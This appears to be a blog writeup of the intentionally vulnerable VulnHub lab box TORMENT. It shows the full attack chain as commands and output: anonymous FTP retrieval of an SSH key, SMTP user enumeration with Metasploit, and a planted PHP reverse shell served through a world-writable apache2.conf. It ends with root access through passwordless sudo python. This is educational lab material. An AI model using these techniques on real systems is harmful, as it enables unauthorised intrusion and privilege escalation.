---
layout: "post"
title: "Digitalworld Local: TORMENT Writeup"
categories: [vulnhub, Digitalworld Local]
tags: [ngircd, python]
---
Torment is enumeration focued box. It's like collecting pieces and forming a picture. We get ssh private key from ftp server, usernames from port 631 and 25, and password from Ngircd. With this information we log in as user patrick. We escalate to another user using apache2.conf and priv esc to root by using python binary.
# Summary
- Portscan
- FTP Enumeration
- Finding users
- Validating users using SMTP
- Finding password
- SSH
- User Patrick
- User Qiu
- Flag

# Recon

## Portscan

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0
| -rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz
| -rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0
| -rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz
| -rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz
| -rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz
| -rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz
| -rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.4.gz
| -rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.5.gz
| -rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz
| -rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 84:c7:31:7a:21:7d:10:d3:a9:9c:73:c2:c2:2d:d6:77 (RSA)
|   256 a5:12:e7:7f:f0:17:ce:f1:6a:a5:bc:1f:69:ac:14:04 (ECDSA)
|_  256 66:c7:d0:be:8d:9d:9f:bf:78:67:d2:bc:cc:7d:33:b9 (ED25519)
25/tcp   open  smtp        Postfix smtpd
|_smtp-commands: TORMENT.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=TORMENT
| Subject Alternative Name: DNS:TORMENT
| Not valid before: 2018-12-23T14:28:47
|_Not valid after:  2028-12-20T14:28:47
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http        Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25
|_http-title: Apache2 Debian Default Page: It works
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      39868/udp6  mountd
|   100005  1,2,3      50240/udp   mountd
|   100005  1,2,3      58479/tcp   mountd
|   100005  1,2,3      60895/tcp6  mountd
|   100021  1,3,4      35655/tcp   nlockmgr
|   100021  1,3,4      43910/udp6  nlockmgr
|   100021  1,3,4      44487/tcp6  nlockmgr
|   100021  1,3,4      56220/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd
|_imap-capabilities: CAPABILITY
445/tcp  open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
631/tcp  open  ipp         CUPS 2.2
| http-methods: 
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Home - CUPS 2.2.1
2049/tcp open  nfs_acl     3 (RPC #100227)
6667/tcp open  irc         ngircd
6668/tcp open  irc         ngircd
6669/tcp open  irc         ngircd
Service Info: Hosts:  TORMENT.localdomain, TORMENT, irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2h46m00s, deviation: 4h37m07s, median: -6m00s
|_nbstat: NetBIOS name: TORMENT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: torment
|   NetBIOS computer name: TORMENT\x00
|   Domain name: \x00
|   FQDN: torment
|_  System time: 2020-06-05T22:08:11+08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-05T14:08:11
|_  start_date: N/A

```

## FTP Recon

FTP server allows `Anonymous login` to the server so we can check the files.

```
$ftp 192.168.1.12
Connected to 192.168.1.12.
220 vsftpd (broken)
Name (192.168.1.12:hitesh): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x   11 ftp      ftp          4096 Sep 17 17:26 .
drwxr-xr-x   11 ftp      ftp          4096 Sep 17 17:26 ..
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .cups
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .ftp
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .imap
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .mysql
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .nfs
drwxr-xr-x    2 ftp      ftp          4096 Jan 04  2019 .ngircd
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .samba
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .smtp
drwxr-xr-x    2 ftp      ftp          4096 Jan 04  2019 .ssh
-rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0
-rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz
-rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0
-rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz
-rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz
-rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz
-rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.4.gz
-rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.5.gz
-rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz
-rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0
-rw-r--r--    1 ftp      ftp        493252 Jan 01  2019 dpkg.status.1.gz
-rw-r--r--    1 ftp      ftp        493252 Jan 01  2019 dpkg.status.2.gz
-rw-r--r--    1 ftp      ftp        492279 Dec 28  2018 dpkg.status.3.gz
-rw-r--r--    1 ftp      ftp        492279 Dec 28  2018 dpkg.status.4.gz
-rw-r--r--    1 ftp      ftp        489389 Dec 28  2018 dpkg.status.5.gz
-rw-r--r--    1 ftp      ftp        470278 Dec 27  2018 dpkg.status.6.gz
-rw-------    1 ftp      ftp          1010 Dec 31  2018 group.bak
-rw-------    1 ftp      ftp           840 Dec 31  2018 gshadow.bak
-rw-------    1 ftp      ftp          2485 Dec 31  2018 passwd.bak
-rw-------    1 ftp      ftp          1575 Dec 31  2018 shadow.bak
226 Directory send OK.
```
There are lots of files and hidden dir on server. I download all the files and checked one by one.
We have `id_rsa` in `.ssh` and `channels` in `.ngircd` directory.
```
$cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C37F0C31D1560056EA1F9204EC405986

U9X/cW7GIiI48TQAzUs5ozEQgexHKiFi2NcoADhs/ax/CTJvZh32k+izzW0mMzl1
mo5HID0qNghIbVbRcN6Zv8cdJ/AhREjy25YZ68zA7GWoyfoch1K/XY0NEnNTchLf
b6k5GEgu5jfQT+pAj1A6jQyzz4A4CGbvD+iEEJRX3qsTlAn6th6dniRORJggnVLB
K4ONTeP4US7GSGTtOD+hwoyoR4zNQKT2Hn/WryoF7LdAXMwf1aNJJJ7YPz1YdSnU
fxXscbOMlXuZ4ouawIVGeYeH85lmOh7aBy5MWsYq/vNC+2pVzVEkRfc6jug1UbdG
hncWxfU92Q47lVuqtc4HPINynD2Q8rBlYrKsEbPqtLyCnBGM/T0Srzztj+IjXUD1
SdbVLmxascquwnIyv2w55vjwJv5dKjLBmrDiY0Doc9YYCGi6cz1p9tsE+G+uRg0r
hGuFXldsYEkoQcJ4iWjsYiqcwWWFfkN+A0rYXqqcDY+aqAy+jXkhyzfmUp3KBz9j
CjR1+7KcmKvNXtjn8V+iv2Nwf+qc2YzBNkBWlwHhxIz6L8F3k3OkqnZUqPKCW2Ga
CNMcIYx3+Gde3aXpHXg4OFALV7y23N8A2h97VOqnnrnED46C39shkA8iiMNdH9mz
87TWgw+wPLbWXJO7G5nJL0qciLV/Eo6atSof3FUx/4WX4fmYeg1Rdy0KgTC1NRGn
VT/YnlBrNW3f7fdhk/YhHbcT9vCg9/Nm3hmzQX/FBP085SgeEA+ebNMzQwPmqcfb
jGpMPdhD7iLmKPwQL3RFTVODjUyzsgJ6kz83aQd80qPClopqp4NFMLwATVpbN858
d4Q0QQGrCRqu2SYaYmVhGo37BJXKE11y0JzWXOhiVLD0I9fBoHDmsKHN4Aw3lbVE
/n+B0Qa1bIMGfXP7J4r7/+4trQCGi7ngVfhtygtg6j/HcoXDy9y15zrHZqKerWd6
6ApM1caan4T0FjqlqTOQsN5GmB9sBCu02VQ1QF3Z4FVA9oW+pkNFxAeKIddG1yLM
5L1ePDgEYjik6vM1lE/65c7fNaO8dndMau4reUnPbTFqKsTA46uUaMyOV6S7nsys
kHGcAXLEzvbC8ojK1Pg5Llok6f8YN+H7cP6vE1yCfx3oU3GdWV36AgBWLON8+Wwc
icoyqfW6E2I0xz5nlHoea/7szCNBI4wZmRI+GRcRgegQvG06QvdXNzjqdezbb4ba
EXRnMddmfjFSihlUhsKxLhCmbaJk5mG2oGLHQcOurvOUPh/qgRBfUf3PTntuUoa0
0+tGGaLYibDNb5eXQ39Bsjzm8BWG/dSK/Qq7UU4Bk2bTKikWQLazPAy482BsZpWI
mXt8ISmJqldgdrtnVvG3zoQBQpspZ6HTojheNazfD4zzvduQguOcKrCNICxoSRgA
egRER+uxaLqNGz+6H+9sl7FYWalMa+VzjrEDU7PeZNgOj9PxLdKbstQLQxC/Zq6+
7kYu2pHwqP2HcXmdJ9xYnptwkuqh5WGR82Zk+JkKwUBEQJmbVxjqWLjCV/CDA06z
6VvrfrPo3xt/CoZkH66qcm9LCTcM3DsLs3UT4B7aH5wk4l5MmpVI4/mx2Dlv0Mkv
-----END RSA PRIVATE KEY-----
```
```
$cat channels 
channels:
games
tormentedprinter
```

## SMB Enumeration
I used smbmap and enum4linux but nothing intresting here.
```
$smbmap -H 192.168.1.12
[+] Guest session   	IP: 192.168.1.12:445	Name: 192.168.1.12                                      
```

```
$enum4linux 192.168.1.12
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Sep 17 17:41:55 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.1.12
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 192.168.1.12    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 192.168.1.12    |
 ============================================ 
Looking up status of 192.168.1.12
	TORMENT         <00> -         B <ACTIVE>  Workstation Service
	TORMENT         <03> -         B <ACTIVE>  Messenger Service
	TORMENT         <20> -         B <ACTIVE>  File Server Service
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 192.168.1.12    |
 ===================================== 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```
## Port 631 (ipp)
We can access port 631 using a browser. In the `/printers` tab, under the queue name, we'll get  some names which could be potential usernames.
![printer](/assets/img/torment/printers.png)
```
albert
cherrlt
david
edmund
ethan
eva
genevieve
govindasamy
jessica
kenny
patrick
qinyi
qiu
roland
sara
```
# Checking vaild Users
Now we have total 15 users. To find out vaild users I used metasploit `smtp` module(`auxiliary/scanner/smtp/smtp_enum`) and got two users are vaild.
``` 
msf6 > use auxiliary/scanner/smtp/smtp_enum
msf6 auxiliary(scanner/smtp/smtp_enum) > set rhosts 192.168.1.12
rhosts => 192.168.1.12
msf6 auxiliary(scanner/smtp/smtp_enum) > set user_file users.txt
user_file => users.txt
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 192.168.1.12:25       - 192.168.1.12:25 Banner: 220 TORMENT.localdomain ESMTP Postfix (Debian/GNU)
[+] 192.168.1.12:25       - 192.168.1.12:25 Users found: patrick, qiu
[*] 192.168.1.12:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
``` 
Two vaild users are:
```
patrick
qiu
```
# Ngircd
After finding users I tried to bruteforce ssh, ftp, http but no luck. So I fouced on Ngircd chat service. I use hexchat to access it. 

![hex1](/assets/img/torment/hex1.png)
![hex2](/assets/img/torment/hex2.png)

We need a password to log in. So I searched for the ngircd configuration file [online](https://www.apt-browse.org/browse/ubuntu/trusty/universe/amd64/ngircd/21-1/file/etc/ngircd/ngircd.conf) and got a default password.
![conf](/assets/img/torment/conf.png)
```
wealllikedebian
```
Now using password connect to the server. 
![hex3](/assets/img/torment/hex3.png)

I used channels names to connect to server that we found during FTP recon.

```
/join #tormentedprinter
```
I used above command to connect to `tormentedprinter` channel and found password.
![hex4](/assets/img/torment/hex4.png)
```
mostmachineshaveasupersecurekeyandalongpassphrase
```
# User Patrick.
Using the SSH key and password from the `tormentedprinter` channel we can log in into ssh.
```
$chmod 600 id_rsa 
$ssh -i id_rsa patrick@192.168.1.12
load pubkey "id_rsa": invalid format
Enter passphrase for key 'id_rsa': 
Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 14 18:09:29 2020 from 192.168.1.2
patrick@TORMENT:~$ 
```
# User qiu
After spending some time I found that the `apache2.conf` has read, write and execute permissions for all the users.
```
patrick@TORMENT:~$ find /etc -type f -writable 2>/dev/null
/etc/apache2/apache2.conf
``` 
Using `apache2.conf` file we can launch the shell as user qiu.
1. Add user qiu and group qiu in `/etc/apache2/apache2.conf`.
![apache](/assets/img/torment/apache.png)
2. Upload php reverse in `/var/www/html` folder.
```
$nc -w 3 192.168.1.12 1234 < shell.php
```
```
patrick@TORMENT:~$ nc -l -p 1234 > /var/www/html/shell.php 
patrick@TORMENT:~$ ls /var/www/html
index.html  secret  shell.php  torment.jpg
```
3. Restart system
```
patrick@TORMENT:~$ sudo /bin/systemctl reboot
patrick@TORMENT:~$ Connection to 192.168.1.12 closed by remote host.
Connection to 192.168.1.12 closed.
```
4. Setup listner and access shell using http://ip/shell.php

```
┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/torrment/ftp]
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.12] 56538
Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
 06:12:34 up 0 min,  0 users,  load average: 2.75, 0.73, 0.25
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
qiu@TORMENT:/$ ^Z
[1]+  Stopped                 nc -nvlp 4444
┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/torrment/ftp]
└──╼ $stty raw -echo
┌─[hitesh@parrot]─[~/boxes/vulnhub/torrment/ftp]
└──╼ $nc -nvlp 4444

qiu@TORMENT:/$ 
```
# Privesc
I checked for the sudoer list and found that `/usr/bin/python` can be run with root privileges without any password.
```
qiu@TORMENT:/$ sudo -l
Matching Defaults entries for qiu on TORMENT:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qiu may run the following commands on TORMENT:
    (ALL) NOPASSWD: /usr/bin/python, /bin/systemctl
qiu@TORMENT:/$ sudo /usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
root@TORMENT:/# 
```
# Final Flag

```text
root@TORMENT:~# cat author-secret.txt 
This is the fourth Linux box written successfully by this author.

Unlike the first three, this had no MERCY, took some DEVELOPMENT and required a sheer ton of BRAVERY.

Setting puzzles has been an author's joy, even though some of these puzzles may be rather mind-bending. The idea is that, even if we are repeatedly testing the basics, the basics can be morphed into so many different forms. The TORMENT box is a fine example.

The privilege escalation, in particular, was inspired from what people would usually learn in Windows privilege escalation --- weak service permissions. In this case, this was extended to Linux through something a little different. Before you think this is fictitious, think for a second --- how many developers have you heard became too lazy to test new configurations, and so decided to chmod 777 themselves? Also, if they can't log in as root directly, they cannot as easily modify /var/www/html, so they'd come up with silly ideas there as well.

Sigh, a New Year's eve disappeared from rushing out this box. But I think it is worth it.

Happy 2019, and many more good years beyond!

Soon I will be writing Windows boxes; these you may be able to find on Wizard-Labs, as a favour for a friend. Otherwise you can find me on my site. Root one of the earlier boxes I had to find out where this is.
```
```
root@TORMENT:~# cat proof.txt 
Congrutulations on rooting TORMENT. I hope this box has been as fun for you as it has been for me. :-)

Until then, try harder!
```
